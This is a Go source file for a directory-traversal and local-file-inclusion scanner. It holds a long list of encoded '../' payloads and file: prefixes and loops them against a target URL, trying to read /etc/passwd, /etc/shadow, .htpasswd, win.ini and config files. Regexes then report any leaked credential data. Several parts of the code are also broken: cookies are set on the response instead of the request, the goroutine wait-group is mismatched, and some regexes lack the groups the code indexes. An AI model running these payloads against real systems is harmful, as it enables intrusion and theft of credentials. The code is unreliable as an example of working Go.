package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"

	"./utils"
)

// this variable is used to controll all goroutines
var controllRoutines sync.WaitGroup

var dotPatter = [...]string{"",
	"/..",
	"....//",
	"//....",
	"%252e%252e%255c",
	"%2e%2e%5c",
	"..%255c",
	"..%5c",
	"%5c../",
	"/%5c..",
	"..\\",
	"%2e%2e%2f",
	"../",
	"..%2f",
	"%2e%2e/",
	"%2e%2e%2f",
	"..%252f",
	"%252e%252e/",
	"%252e%252e%252f",
	"..%5c..%5c",
	"%2e%2e\\",
	"%2e%2e%5c",
	"%252e%252e\\",
	"%252e%252e%255c",
	"..%c0%af",
	"%c0%ae%c0%ae/",
	"%c0%ae%c0%ae%c0%af",
	"..%25c0%25af",
	"%25c0%25ae%25c0%25ae/",
	"%25c0%25ae%25c0%25ae%25c0%25af",
	"..%c1%9c",
	"%c0%ae%c0%ae\\",
	"%c0%ae%c0%ae%c1%9c",
	"..%25c1%259c",
	"%25c0%25ae%25c0%25ae\\",
	"%25c0%25ae%25c0%25ae%25c1%259c",
	"..%%32%66",
	"%%32%65%%32%65/",
	"%%32%65%%32%65%%32%66",
	"..%%35%63",
	"%%32%65%%32%65/",
	"%%32%65%%32%65%%35%63",
	"../",
	"...\\",
	"..../",
	"....\\",
	"........................................................................../",
	"..........................................................................\\",
	"..%u2215",
	"%uff0e%uff0e%u2215",
	"..%u2216",
	"..%uEFC8",
	"..%uF025",
	"%uff0e%uff0e\\",
	"%uff0e%uff0e%u2216",
}

var invertedPattern = []string{"",
	"./",
	"/",
	"\\",
	"",
	".\\",
	"file:",
	"file:/",
	"file://",
	"file:///",
}

var filesPattern = []string{
	"/etc/passwd",
	"windows/win.ini",
	"apache/logs/error.log",
	"apache/logs/access.log",
	"/etc/passwd",
	"c:WINDOWS/system32/",
	"install.php",
	"/config.asp",
	"/core/config.php",
	"admin/access_log",
	"root/.htpasswd",
	".htpasswd",
	"administrator/inbox",
	"dev",
	"/etc/passwd%00",
	"/etc/passwd",
	"etc/shadow%00",
	"etc/shadow",
}

func sendRequests(url string, cookies string) string {

	resp, err := http.Get(url)
	resp.Header.Add("Cookie", cookies)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	return string(body)
}

func validateInput(url string, endpoint string) {
	if url == "" {
		fmt.Println("[-] URL not defined.. ")
		os.Exit(0)
	}

	if endpoint == "" {
		fmt.Println("[-] endpoint not defined.. ")
		os.Exit(0)
	}
}

func validateURLendPoints(url string, endPoint string) {
	if !strings.Contains(url, endPoint) {
		fmt.Println("[-] Endpoint not found in URL !")
		os.Exit(0)
	}
}

func validateURL(url string) {
	if !strings.Contains(url, "http://") && !strings.Contains(url, "https://") {
		fmt.Println("[-] Provide a correct schema http:// or https://")
		os.Exit(1)
	}

}

func findEndPointUser(URL string, pattern string) string {
	st := strings.Replace(URL, "*", pattern, -1) // -1 all instances of * will be replace
	return st
}

func findETCPasswd(response string, requestPattern string) {
	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
	matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
	if len(matchEtcPasswd) != 0 {
		fmt.Printf(utils.SetColorGreen("---> [+] ETC/PASSWD FOUND: %s : payload: %s \n"), matchEtcPasswd[1], requestPattern)

	}
}

func findETCHosts(response string, requestPattern string) {
	etcHosts := regexp.MustCompile(`(?m)^\s*([0-9.:]+)\s+([\w.-]+)`)
	matchEtcHosts := etcHosts.FindStringSubmatch(response)
	if len(matchEtcHosts) != 0 {
		fmt.Printf("---> [+] ETC/HOSTS: %s : payload: %s \n", matchEtcHosts[1], requestPattern)
	}
}

func findHtAcess(response string, requestPattern string) {
	htAcess := regexp.MustCompile(`AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile|IfModule`)
	matchHtAcess := htAcess.FindStringSubmatch(response)
	if len(matchHtAcess) != 0 {
		fmt.Printf("---> [+] HTACESS FOUND: %s payload: %s \n", matchHtAcess[1], requestPattern)
	}

}

func findetcShadow(response string, requestPattern string) {
	etcShadow := regexp.MustCompile(`^[a-z0-9][a-z0-9]*::`)
	matchShadow := etcShadow.FindStringSubmatch(response)
	if len(matchShadow) != 0 {
		fmt.Printf("---> [+] ETC/SHADOW FOUND: %s \n payload: %s ", matchShadow[1], requestPattern)
	}

}

func findSystem32(response string, requestPattern string) {
	sys32 := regexp.MustCompile(`[^]*?`)
	mathSys32 := sys32.FindStringSubmatch(response)
	if len(mathSys32) != 0 {
		fmt.Printf("---> [+] Sys32 FOUND: %s \n payload: %s ", mathSys32[1], requestPattern)
	}
}

func main() {

	utils.Banner()

	url := flag.String("url", "", "url from target")
	endPoint := flag.String("endpoint", "", "String in --url to attack. Ex: document.pdf")
	cookies := flag.String("cookies", "", "Cookies from authenticated path")
	goin := flag.Int("goin", 3, "max of recursive ../../../ default: 3")
	flag.Parse()

	// checking inputs
	validateInput(*url, *endPoint)
	validateURL(*url)
	validateURLendPoints(*url, *endPoint)

	// info prints
	fmt.Println("[+]TARGET: ", utils.SetColorBlue(*url))
	fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*endPoint))
	fmt.Println("[+]DEPH SET: ", *goin)
	if *cookies != "" {
		fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*cookies))
	}

	fmt.Println(utils.SetColorYela("[+] INIT REQUESTS [+]"))

	count := 0
	for count != (*goin + 1) {
		fmt.Println("[+] Depth: ", count)
		for _, pattern := range dotPatter {
			for _, inverted := range invertedPattern {
				for _, file := range filesPattern {
					st := strings.Repeat(pattern, count)
					fullPattern := inverted + st + file
					asteristicEndPoint := findEndPointUser(*url, fullPattern)
					fmt.Println(asteristicEndPoint)
					requestPattern := asteristicEndPoint
					response := sendRequests(requestPattern, *cookies)

					controllRoutines.Add(4)
					go findETCPasswd(response, requestPattern)
					go findETCHosts(response, requestPattern)
					go findHtAcess(response, requestPattern)
					go findetcShadow(response, requestPattern)
				}
			}
		}
		count++
	}
	fmt.Println(utils.SetColorYela("[+] All routines are finished !"))
	controllRoutines.Done()
}
